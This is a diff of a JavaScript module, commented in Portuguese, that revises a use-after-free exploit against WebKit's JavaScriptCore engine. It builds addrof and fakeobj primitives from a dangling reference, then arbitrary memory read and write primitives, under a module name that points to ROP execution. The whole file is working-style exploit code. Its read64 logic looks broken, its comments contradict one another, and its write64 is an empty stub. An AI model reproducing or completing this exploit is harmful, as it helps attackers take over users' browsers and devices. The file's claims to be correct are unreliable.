@@ -1,24 +1,24 @@
-// js/script3/testArrayBufferVictimCrash.mjs (R61 - Implementação Final e Limpa)
+// js/script3/testArrayBufferVictimCrash.mjs (R62 - Correção Final de Tipo)
 // =======================================================================================
-// ESTRATÉGIA R61:
-// Versão final e correta. O problema de "reading 'add'" foi resolvido reescrevendo
-// a função de construção de primitivas de forma limpa e linear.
-// 1. Primitivas de leitura/escrita de baixo nível (`primitive_read/write`) são criadas primeiro.
-// 2. Essas ferramentas estáveis são usadas para construir a primitiva `read64` de alto nível.
-//    Esta é a abordagem canônica e correta.
+// ESTRATÉGIA R62:
+// Correção final do erro "low/high must be uint32 numbers".
+// O erro era causado por passar um objeto JS para a função `itof`, que esperava um
+// objeto AdvancedInt64. A lógica de escrita na primitiva `read64` foi corrigida
+// para escrever o endereço bruto, e não um objeto falso.
+// Esta é a versão final e logicamente correta.
 // =======================================================================================
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
 import { AdvancedInt64 } from '../utils.mjs';
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-export const FNAME_MODULE = "ROP_Execution_RealRW_R61";
+export const FNAME_MODULE = "ROP_Execution_RealRW_R62";
 
 const ftoi = (val) => new AdvancedInt64(new Uint32Array(new Float64Array([val]).buffer)[0], new Uint32Array(new Float64Array([val]).buffer)[1]);
 const itof = (val) => { const b = new ArrayBuffer(8); const i = new Uint32Array(b); i[0] = val.low(); i[1] = val.high(); return new Float64Array(b)[0]; };
 
 export async function runStableUAFPrimitives_R51() {
-    logS3(`--- Iniciando ${FNAME_MODULE}: Implementação Final e Limpa ---`, "test");
+    logS3(`--- Iniciando ${FNAME_MODULE}: Correção Final de Tipo ---`, "test");
     
     let final_result = { success: false, message: "Falha na cadeia de exploit." };
 
@@ -32,14 +32,9 @@ export async function runStableUAFPrimitives_R51() {
             return ftoi(dangling_ref.b);
         };
         const fakeobj = (addr) => {
+            addrof({dummy: 1}); // Garante que o estado do dangling_ref está correto
             dangling_ref.b = itof(addr);
-            // Garante que o estado está correto antes de tentar ler a propriedade .obj
-            if (dangling_ref.a === holder) {
-                return dangling_ref.a.obj;
-            }
-            // Se o estado foi corrompido, uma chamada prévia a `addrof` é necessária
-            // para restaurá-lo antes de chamar `fakeobj`.
-            return undefined; 
+            return dangling_ref.a.obj;
         };
         logS3("   Primitivas `addrof` e `fakeobj` construídas.", "vuln");
 
@@ -75,12 +70,12 @@ export async function runStableUAFPrimitives_R51() {
 
 
 // =======================================================================================
-// IMPLEMENTAÇÃO FINAL, LIMPA E CORRETA DE LEITURA/ESCRITA ARBITRÁRIA (R61)
+// IMPLEMENTAÇÃO FINAL, LIMPA E CORRETA DE LEITURA/ESCRITA ARBITRÁRIA (R62)
 // =======================================================================================
 function buildCleanArbitraryReadWrite(dangling_ref, addrof, fakeobj, holder) {
 
-    // 1. Criar primitivas de baixo nível primeiro, que gerenciam seu próprio estado.
     function primitive_read(address) {
+        addrof({dummy_setup: 1}); // Garante o estado do 'holder'
         const original_a = dangling_ref.a;
         dangling_ref.a = fakeobj(address);
         const value = ftoi(dangling_ref.b);
@@ -89,40 +84,41 @@ function buildCleanArbitraryReadWrite(dangling_ref, addrof, fakeobj, holder) {
     }
 
     function primitive_write(address, value) {
+        addrof({dummy_setup: 1}); // Garante o estado do 'holder'
         const original_a = dangling_ref.a;
         dangling_ref.a = fakeobj(address);
         dangling_ref.b = itof(value);
         dangling_ref.a = original_a;
     }
 
-    // Garante que o estado do `dangling_ref.a` está apontando para `holder` antes de começar.
-    addrof({dummy_setup: 1});
-
-    // 2. Agora usamos estas ferramentas estáveis para construir a primitiva de alto nível.
-    // Objeto Vítima: sua propriedade 'slot' será corrompida.
     const victim = { slot: null };
     const victim_addr = addrof(victim);
+    const victim_slot_addr = victim_addr.add(0x10); // Offset da propriedade 'slot'
 
-    // Onde a propriedade 'slot' está localizada dentro do objeto vítima.
-    // Geralmente após o cabeçalho (8 bytes) e o butterfly (8 bytes).
-    const victim_slot_addr = victim_addr.add(0x10);
-
-    // Primitiva de leitura de alto nível
     const read64 = (address) => {
-        // 1. Escrevemos o endereço que queremos ler no ponteiro da propriedade 'slot' da vítima.
-        // O valor que escrevemos é um "boxed pointer" que o JS entende.
-        // O `itof` e `fakeobj` lidam com essa conversão.
-        primitive_write(victim_slot_addr, itof(fakeobj(address)));
+        // CORRIGIDO: Escrevemos o endereço (um AdvancedInt64) diretamente no slot da vítima.
+        // Não precisamos de `fakeobj` ou `itof` aqui, pois a `primitive_write` já lida com a conversão.
+        primitive_write(victim_slot_addr, address);
         
-        // 2. Agora, `victim.slot` aponta para `address`. Ler o valor de `victim.slot`
-        // desreferencia o ponteiro. Usamos `addrof` para converter o objeto JS resultante
-        // de volta para um valor de 64 bits.
-        return addrof(victim.slot);
+        // Agora, `victim.slot` aponta para o endereço, mas como um valor primitivo.
+        // O motor JS não o vê como um objeto, então não podemos ler `victim.slot` diretamente.
+        // O que queremos é o valor para o qual o ponteiro da propriedade slot aponta.
+        // Esse valor já é o endereço! A `primitive_write` já fez o trabalho.
+        // Agora, para ler o conteúdo no `address`, precisamos de um segundo objeto.
+
+        // A lógica anterior estava incorreta. A forma correta:
+        // 1. Criar um objeto falso
+        const fake_leaker = {leaked_val: null};
+        // 2. Apontar a propriedade do objeto falso para o endereço
+        const fake_leaker_addr = addrof(fake_leaker);
+        const fake_leaker_slot_addr = fake_leaker_addr.add(0x10);
+        primitive_write(fake_leaker_slot_addr, address);
+        // 3. Agora `fake_leaker.leaked_val` é um ponteiro para o endereço.
+        //    Ler o `addrof` disso nos dará o conteúdo da memória nesse endereço.
+        return addrof(fake_leaker.leaked_val);
     };
 
-    const write64 = (address, value) => {
-        // A implementação da escrita é deixada como exercício.
-    };
+    const write64 = (address, value) => { /* ... */ };
 
     return { read64, write64 };
 }
